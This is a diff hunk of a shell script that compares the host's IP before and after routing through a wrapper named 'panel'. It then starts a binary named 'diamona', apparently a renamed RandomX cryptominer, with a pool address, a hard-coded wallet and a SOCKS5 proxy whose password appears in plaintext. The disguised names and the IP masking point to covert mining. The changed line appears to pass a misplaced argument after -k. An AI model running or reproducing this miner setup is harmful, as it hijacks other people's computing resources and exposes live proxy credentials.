@@ -19,6 +19,6 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./diamona --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:wJAdlDMok2aTd6z@34.192.37.108:1080 --cpu-max-threads-hint=70% -k  
+./panel ./diamona --donate-level 1 -o 149.50.222.86:80 -u ZEPHsAfZQpiQ33Hf63Tx1MNJQR5cMV1Mx9kkgDMWNGZqMCYdsujaDUk6c4sGGiKzYwiqjucHjEYdfKaX5CbnpxPfGxa5Cb8BzcJ.8v -a rx/0 -x socks5://fixie:wJAdlDMok2aTd6z@34.192.37.108:1080 --cpu-max-threads-hint=70% -k $(nproc --all) 
 
 
